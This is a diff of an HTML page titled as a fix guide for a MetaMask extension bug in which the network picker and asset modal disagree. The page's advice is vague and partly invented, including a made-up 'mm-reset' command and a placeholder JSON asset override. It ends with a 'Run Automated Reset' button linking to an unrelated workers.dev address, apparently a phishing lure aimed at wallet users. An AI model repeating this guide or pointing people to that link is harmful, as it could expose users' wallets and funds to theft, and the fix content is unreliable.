@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Assets Miss Match Between Network Picker – Fix Guide</title>
 <style>
     body {
-        font-family: -apple-system;
+        font-family: sans-serif;
         background: #1a1a24;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff7b2c; }
     .btn {
-        background: #cf6679;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,32 +42,38 @@
 <h1>Metamask Extension Bug Assets Miss Match Between Network Picker</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a mismatch between the assets displayed in the network picker and the modal window, showing "All popular" assets, when using the Metamask extension on the Ethereum (ETH) ecosystem.</li>
+<li>Users experience a mismatch between the network selected in the Metamask extension's network picker and the assets displayed in the modal, which shows "All popular" assets from a different network.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a bug in the Metamask extension, where the network picker and modal window are not properly synchronized, resulting in a discrepancy between the displayed assets.</li>
+<li>The error occurs due to a desynchronization between the network picker's state and the asset modal's data source, likely caused by a bug in the Metamask extension's code that handles network changes and asset retrieval.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, try the following manual overrides:</li>
-<li>Update the Metamask extension to the latest version</li>
-<li>Reset the Metamask settings to default using the following command:</li>
+<li>Try resetting the Metamask extension by reinstalling it or clearing its storage.</li>
+<li>Use the following JSON configuration to manually override the asset list:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>mm-reset<span class="w"> </span>--default
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;network&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;mainnet&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;assets&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;symbol&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ETH&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;decimals&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">18</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">]</span>
+<span class="p">}</span>
 </code></pre></div>
 
 <ul>
-<li>Manually configure the network settings using a JSON configuration file</li>
+<li>Utilize the <code>eth_chainId</code> RPC method to verify the current chain ID and ensure it matches the expected network.</li>
 </ul>
-<p>Consider using an external console for further debugging and customization. </p>
-<h2>Prerequisites</h2>
-<ul>
-<li>Metamask extension installed and configured</li>
-<li>Ethereum (ETH) ecosystem selected as the primary network</li>
-<li>Basic understanding of JSON configuration files and command-line interfaces</li>
-</ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-swap-and-bridge-fail-on-arbitrum-network.html">Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sl-tp-percentages-change-when-changing-l.html">Metamask Extension Bug Sl Tp Percentages Change When Changing L</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li></ul>
+<p>Prerequisites:
+* Metamask extension installed and configured
+* Basic understanding of Ethereum networks and assets
+* Familiarity with JSON configuration files</p>
+<p>For more advanced debugging, consider using an external console to inspect the Metamask extension's internal state.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-bug-swap-and-bridge-fail-on-arbitrum-network.html">Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
